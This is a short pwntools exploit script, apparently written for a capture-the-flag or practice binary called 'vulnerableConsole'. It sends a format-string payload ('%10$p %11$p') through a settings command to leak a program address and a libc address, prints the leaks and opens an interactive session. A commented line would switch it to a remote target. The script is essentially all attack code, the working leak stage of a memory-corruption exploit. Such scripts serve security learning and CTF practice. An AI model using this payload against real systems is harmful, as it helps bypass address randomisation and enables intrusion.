from pwn import *
fileName = './vulnerableConsole'
context.binary = fileName
e = ELF(fileName)

## .got + .sym + .plt are all valid methods to get an address
#putsAdd = e.got['puts']

## to test locally use proccess, otherwise remote in
p = process(fileName)
#p = remote(ip,port)

#line = "lalala"
#p.sendline(line)
#p.sendline(p64(line))


# 10%p = .description leak 11%p = libc leak
p.recvuntil(b'Exit\n')
p.sendline('settings uptime %10$p %11$p')
p.sendline('info uptime\n')
p.recvuntil(b'updated.\n')
leaks = p.recvline()
print(f"LEAKS {leaks}")
p.interactive()
